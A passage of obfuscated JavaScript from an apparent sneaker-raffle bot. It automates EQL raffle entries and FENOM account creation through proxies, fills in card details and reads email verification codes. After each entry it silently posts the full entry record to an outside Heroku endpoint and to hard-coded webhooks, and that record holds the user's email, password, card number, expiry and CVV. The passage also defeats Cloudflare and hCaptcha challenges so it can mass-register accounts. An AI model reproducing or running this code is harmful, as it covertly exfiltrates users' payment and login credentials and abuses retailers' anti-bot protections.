                            await _0x468cfd(0x3e8), await _0x468cfd(0x1f4), await _0x227281['type']('#address1', _0x19f0a7[_0x234713]['Address1'] + '\x20' + _0x19f0a7[_0x234713]['HouseNumber']), await _0x468cfd(0x1f4), await _0x227281['type']('#address2', '' + _0x19f0a7[_0x234713]['Address2']), await _0x468cfd(0x1f4), await _0x227281['type']('#city', '' + _0x19f0a7[_0x234713]['City']), await _0x468cfd(0x1f4), await _0x227281['type']('#postcode', '' + _0x19f0a7[_0x234713]['Zip']), await _0x468cfd(0x3e8), await _0x227281['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x468cfd(0x3e8), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x227281['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x468cfd(0x7d0), await _0x227281['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x468cfd(0x12c), await _0x227281['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x468cfd(0x4b0), await _0x227281['keyboard']['type']('' + _0x19f0a7[_0x234713]['CardNumber']), await _0x468cfd(0x320), await _0x227281['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x227281['keyboard']['type']('' + _0x19f0a7[_0x234713]['ExpiryDate']), await _0x468cfd(0x4b0), await _0x227281['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x227281['keyboard']['type']('' + _0x19f0a7[_0x234713]['CVV']), await _0x468cfd(0x226), await _0x227281['type']('input[name=\x22postalCode\x22]', '' + _0x19f0a7[_0x234713]['Zip']), await _0x468cfd(0x226), await _0x227281['click']('#paymentConsent'), await _0x468cfd(0x226), await _0x227281['click']('#termsConsent'), await _0x468cfd(0x2bc), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x227281['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x468cfd(0x2710);
                            try {
                                await _0x227281['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x468cfd(0xbb8), await _0x227281['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x462134 => _0x462134['click']()), await _0x227281['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x52f794 => _0x52f794['click']());
                            } catch {
                            }
                            try {
                                await _0x227281['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x1601a5 = await _0x227281['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x1601a5) {
                                    _0x51338a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x19f0a7[_0x234713]['Email'] + ',' + _0x19f0a7[_0x234713]['Password'] + ',' + _0x19f0a7[_0x234713]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x385d38() {
                                var _0x1547e5, _0x121bff = ![];
                                for (var _0x32dbb7 = 0x0; _0x32dbb7 < 0x18; _0x32dbb7++) {
                                    async function _0x22dff2() {
                                        var _0x1c0920 = new _0x3b7ac6({
                                            'user': _0x2c28ef['masterMail'],
                                            'password': _0x2c28ef['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5d99a7(_0x14db46) {
                                            _0x1c0920['openBox']('INBOX', ![], _0x14db46);
                                        }
                                        _0x1c0920['once']('ready', function () {
                                            console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5d99a7(function (_0x1d3bff, _0xf4b15b) {
                                                console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1d3bff)
                                                    throw _0x1d3bff;
                                                _0x1c0920['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x471ab3, _0x193c30) {
                                                    if (!_0x193c30 || !_0x193c30['length'])
                                                        console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1c0920['end']();
                                                    else {
                                                        var _0x4da4c8 = _0x1c0920['seq']['fetch'](_0x193c30, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4da4c8['on']('message', function (_0x5d3d84, _0x267930) {
                                                            var _0x49cd6a = '(#' + _0x267930 + ')\x20';
                                                            _0x5d3d84['on']('body', function (_0x2929a7, _0x161bce) {
                                                                _0x4bee6e(_0x2929a7, (_0x88aa45, _0x2086ee) => {
                                                                    if (_0x2086ee['subject']['includes']('code')) {
                                                                        const _0x17b4e4 = _0x2086ee['text']['split']('\x0a\x0a')[0x3], _0x4d3c57 = _0x17b4e4['split']('\x0a')[0x1];
                                                                        _0x1547e5 = _0x4d3c57;
                                                                    }
                                                                });
                                                            }), _0x5d3d84['once']('end', function () {
                                                            });
                                                        }), _0x4da4c8['once']('error', function (_0x2f2071) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4da4c8['once']('end', function () {
                                                            _0x1c0920['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1c0920['once']('error', function (_0x199fbe) {
                                            console['log'](_0x54c1f9['red'](_0x199fbe['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x121bff = !![];
                                        }), _0x1c0920['once']('end', async function () {
                                        }), _0x1c0920['connect']();
                                    }
                                    _0x22dff2(), await _0x468cfd(0x1388);
                                    if (_0x1547e5)
                                        return _0x1547e5;
                                    if (_0x121bff)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x32dbb7 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x385d38(), await _0x468cfd(0x1f4), await _0x227281['type']('#code', '' + code), await _0x468cfd(0x3e8), await _0x227281['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x5c1f7a => _0x5c1f7a['click']()), await _0x227281['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x227281['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x19f0a7[_0x234713]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x51338a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x19f0a7[_0x234713]['Email'] + ',' + _0x19f0a7[_0x234713]['Password'] + ',' + _0x19f0a7[_0x234713]['Phone']), _0x62a82b = 'no', _0x504d25(_0x19f0a7[_0x234713], _0xaf4879);
                            var _0x30619f = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', ![]), _0xc7ce37 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'pub', ![]);
                            let _0x4af686 = _0x19f0a7[_0x234713];
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0xaf4879['name'],
                                    'entrydata': JSON['stringify'](_0x4af686),
                                    'proxy': '' + _0x5ddbae[_0x234713]
                                };
                                var _0x4f3a68 = JSON['stringify'](prxdata);
                                let _0x4c9f21 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x4f3a68, _0x4c9f21);
                            } catch (_0x27b346) {
                            }
                            const _0x2fe53e = {
                                'succesDEVMSG': { 'embeds': [_0x30619f] },
                                'succesPUBMSG': { 'embeds': [_0xc7ce37] }
                            };
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x2fe53e['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x2fe53e['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x2fe53e['succesPUBMSG']);
                            } catch (_0x3570f5) {
                                console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3570f5));
                            }
                        } catch (_0x5e2c46) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20' + _0x5e2c46)), _0x4ec248 = '' + _0x5e2c46;
                            var _0x5eb0e2 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', !![], _0x4ec248), _0x30619f = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', ![]), _0xc7ce37 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'pub', ![]);
                            const _0x5c0ff7 = {
                                'succesDEVMSG': { 'embeds': [_0x30619f] },
                                'succesPUBMSG': { 'embeds': [_0xc7ce37] }
                            };
                            _0x5c0ff7['errorDEV'] = { 'embeds': [_0x5eb0e2] };
                            _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x5c0ff7['errorDEV']);
                            await _0x4feadc(_0x408671, _0x5c0ff7['errorDEV']);
                            if (!_0x62a82b == 'no')
                                _0x62a82b = 'yes';
                        } finally {
                            _0x11a27e && _0x11a27e['close']();
                            if (_0x62a82b == 'yes' && _0x145d67 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Retrying\x20(' + _0x145d67 + '\x20/\x205)')), _0x234713 = _0x234713 - 0x1, _0x145d67 = _0x145d67 + 0x1;
                                continue;
                            }
                            _0x62a82b == 'yes' && _0x145d67 >= 0x5 && (_0x5cd42d(_0x19f0a7[_0x234713], _0xaf4879), _0x62a82b = 'no', _0x145d67 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    } else {
                        const _0x394657 = '' + _0x19f0a7[_0x234713]['Url'];
                        if (_0x62a82b != 'yes')
                            var _0x62a82b = '', _0x145d67 = 0x0;
                        if (_0x19f0a7[_0x234713]['Email'] == '' || _0x19f0a7[_0x234713]['FirstName'] == '' || _0x19f0a7[_0x234713]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x19f0a7[_0x234713]['Password'] == '' && (_0x19f0a7[_0x234713]['Password'] = 'JRaffles23!');
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x37e2bb = _0x5ddbae[_0x234713]['split'](':');
                        else
                            var _0x169175 = Math['round'](Math['random']() * (_0x5ddbae['length'] - 0x1)), _0x37e2bb = _0x5ddbae[_0x169175]['split'](':');
                        var _0x11a27e;
                        try {
                            _0x11a27e = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37e2bb[0x0] + ':' + _0x37e2bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11a27e = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37e2bb[0x0] + ':' + _0x37e2bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x261f16 = await _0x11a27e['newPage']();
                            await _0x261f16['authenticate']({
                                'username': '' + _0x37e2bb[0x2],
                                'password': '' + _0x37e2bb[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x261f16['setRequestInterception'](!![]), _0x261f16['on']('request', _0x4f90f2 => {
                                _0x4f90f2['resourceType']() === 'image' || _0x4f90f2['resourceType']() === 'font' || _0x4f90f2['resourceType']() === 'media' ? _0x4f90f2['abort']() : _0x4f90f2['continue']();
                            }), await _0x261f16['goto'](_0x394657), await _0x261f16['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x261f16['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x468cfd(0x7d0), await _0x261f16['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x261f16['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x468cfd(0x3e8), await _0x261f16['waitForSelector']('#email'), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x261f16['type']('#email', '' + _0x19f0a7[_0x234713]['Email']), await _0x468cfd(0x352), await _0x261f16['waitForSelector']('#password'), await _0x261f16['type']('#password', '' + _0x19f0a7[_0x234713]['Password']), await _0x468cfd(0x352), await _0x261f16['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x468cfd(0x3e8);
                            try {
                                await _0x261f16['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x504d25(_0x19f0a7[_0x234713], _0xaf4879), _0x62a82b = 'no';
                                continue;
                            }
                            await _0x261f16['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x468cfd(0x3e8), await _0x261f16['click']('li[data-value=\x22EU\x20' + _0x19f0a7[_0x234713]['Size'] + '\x22]'), await _0x468cfd(0x1f4), await _0x261f16['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x261f16['focus']('#postcode'), await _0x261f16['keyboard']['down']('Control'), await _0x261f16['keyboard']['press']('A'), await _0x261f16['keyboard']['up']('Control'), await _0x261f16['keyboard']['press']('Backspace'), await _0x261f16['keyboard']['type'](_0x19f0a7[_0x234713]['Zip']), await _0x468cfd(0x60e), await _0x261f16['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x468cfd(0x3e8), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x261f16['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x261f16['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x261f16['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x468cfd(0x4b0), await _0x261f16['keyboard']['type']('' + _0x19f0a7[_0x234713]['CardNumber']), await _0x468cfd(0x320), await _0x261f16['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x261f16['keyboard']['type']('' + _0x19f0a7[_0x234713]['ExpiryDate']), await _0x468cfd(0x4b0), await _0x261f16['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x261f16['keyboard']['type']('' + _0x19f0a7[_0x234713]['CVV']), await _0x468cfd(0x226), await _0x261f16['type']('input[name=\x22postalCode\x22]', '' + _0x19f0a7[_0x234713]['Zip']), await _0x468cfd(0x226), await _0x261f16['click']('#paymentConsent'), await _0x468cfd(0x226), await _0x261f16['click']('#termsConsent'), await _0x468cfd(0x2bc), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x261f16['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x468cfd(0x2710);
                            try {
                                await _0x261f16['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x468cfd(0xbb8), await _0x261f16['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x585115 => _0x585115['click']()), await _0x261f16['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x326dd2 => _0x326dd2['click']());
                            } catch {
                            }
                            try {
                                await _0x261f16['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x504d25(_0x19f0a7[_0x234713], _0xaf4879);
                            var _0x30619f = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', ![]), _0xc7ce37 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'pub', ![]);
                            let _0x11c61f = _0x19f0a7[_0x234713];
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0xaf4879['name'],
                                    'entrydata': JSON['stringify'](_0x11c61f),
                                    'proxy': '' + _0x5ddbae[_0x234713]
                                };
                                var _0x4f3a68 = JSON['stringify'](prxdata);
                                let _0xbc5377 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x4f3a68, _0xbc5377);
                            } catch (_0x6e344b) {
                            }
                            const _0x5b69e0 = {
                                'succesDEVMSG': { 'embeds': [_0x30619f] },
                                'succesPUBMSG': { 'embeds': [_0xc7ce37] }
                            };
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x5b69e0['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x5b69e0['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x5b69e0['succesPUBMSG']);
                            } catch (_0x4a8abe) {
                                console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4a8abe));
                            }
                            _0x62a82b = 'no';
                        } catch (_0x4835a3) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20' + _0x4835a3)), _0x4ec248 = '' + _0x4835a3;
                            var _0x5eb0e2 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', !![], _0x4ec248), _0x30619f = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'dev', ![]), _0xc7ce37 = await _0x436de5(_0x19f0a7[_0x234713], _0xaf4879, 'pub', ![]);
                            const _0x2763a6 = {
                                'succesDEVMSG': { 'embeds': [_0x30619f] },
                                'succesPUBMSG': { 'embeds': [_0xc7ce37] }
                            };
                            _0x2763a6['errorDEV'] = { 'embeds': [_0x5eb0e2] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x2763a6['errorDEV']), await _0x4feadc(_0x408671, _0x2763a6['errorDEV']), _0x62a82b = 'yes';
                        } finally {
                            _0x11a27e && _0x11a27e['close']();
                            if (_0x62a82b == 'yes' && _0x145d67 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Retrying\x20(' + _0x145d67 + '\x20/\x205)')), _0x234713 = _0x234713 - 0x1, _0x145d67 = _0x145d67 + 0x1;
                                continue;
                            }
                            _0x62a82b == 'yes' && _0x145d67 >= 0x5 && (_0x5cd42d(_0x19f0a7[_0x234713], _0xaf4879), _0x62a82b = 'no', _0x145d67 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x47cba0, _0x38033d, _0x127a72) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x34531d = 0x0; _0x34531d < _0x38033d['length']; _0x34531d++) {
                        if (_0x111392 != 'yes')
                            var _0x111392 = '', _0x4aa74f = 0x0;
                        var _0x2d331a;
                        try {
                            await _0x16822f(_0x38033d, _0x34531d);
                        } catch {
                            _0x111392 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x48898b(_0x47cba0['name'] + '\x20Task\x20' + (_0x34531d + 0x1) + '\x20/\x20' + _0x38033d['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x4983b3 = await _0x436de5(_0x38033d[_0x34531d], _0x47cba0, 'acc', ![]);
                        const _0x55781e = { 'succesDEVMSG': { 'embeds': [_0x4983b3] } }, _0x6b3736 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x23964b = Math['round'](Math['random']() * (_0x127a72['length'] - 0x1)), _0x4165aa = _0x127a72[_0x23964b]['split'](':'), _0x47f69b;
                        try {
                            _0x47f69b = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4165aa[0x0] + ':' + _0x4165aa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x47f69b = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4165aa[0x0] + ':' + _0x4165aa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4bd84f = await _0x47f69b['newPage']();
                            await _0x4bd84f['setViewport']({
                                'width': 0x500 + _0x120a07(0x1, 0x32),
                                'height': 0x2d9 + _0x120a07(0x1, 0x32)
                            });
                            const _0x15e972 = await _0x4bd84f['target']()['createCDPSession'](), { windowId: _0x2c200d } = await _0x15e972['send']('Browser.getWindowForTarget');
                            await _0x4bd84f['authenticate']({
                                'username': '' + _0x4165aa[0x2],
                                'password': '' + _0x4165aa[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4bd84f['goto']('' + _0x6b3736, { 'waitUntil': 'networkidle2' }), console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x468cfd(0x1388);
                            var _0x46fc69 = await _0x4bd84f['$']('.hcaptcha-box');
                            if (_0x46fc69) {
                                console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x468cfd(0x2710);
                                const _0x11b39c = await _0x4bd84f['$']('.hcaptcha-box');
                                if (_0x11b39c)
                                    try {
                                        await _0x11b39c['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x4bd84f['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x415534 = await _0x4bd84f['$']('.hcaptcha-box');
                                    if (_0x415534)
                                        try {
                                            await _0x415534['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x4bd84f['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x15e972['send']('Browser.setWindowBounds', {
                                    'windowId': _0x2c200d,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x468cfd(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4bd84f['type']('input[name=\x22firstname\x22]', '' + _0x38033d[_0x34531d]['FirstName']), await _0x468cfd(0x1f4), await _0x4bd84f['type']('input[name=\x22lastname\x22]', '' + _0x38033d[_0x34531d]['LastName']), await _0x468cfd(0x1f4), await _0x4bd84f['type']('input[name=\x22email\x22]', '' + _0x38033d[_0x34531d]['Email']), await _0x468cfd(0x1f4), await _0x4bd84f['type']('input[name=\x22password\x22]', '' + _0x38033d[_0x34531d]['Password']), await _0x468cfd(0x258), await _0x4bd84f['$eval']('input[name=\x22psgdpr\x22]', _0x5ecf85 => _0x5ecf85['click']()), await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4bd84f['$eval']('#customer-form', _0x3c5ea4 => _0x3c5ea4['submit']());
                            try {
                                try {
                                    await _0x4bd84f['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x111392 = 'no', console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Account\x20' + _0x38033d[_0x34531d]['Email'] + '\x20Generated')), _0x51338a['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x38033d[_0x34531d]['Email'] + ',' + _0x38033d[_0x34531d]['Password']);
                                let _0x591b31 = _0x38033d[_0x34531d];
                                try {
                                    prxdata = {
                                        'username': _0x50fbd1['replace']('#', ''),
                                        'module': _0x47cba0['name'],
                                        'entrydata': JSON['stringify'](_0x591b31),
                                        'proxy': '' + _0x127a72[_0x34531d]
                                    };
                                    var _0x3d7617 = JSON['stringify'](prxdata);
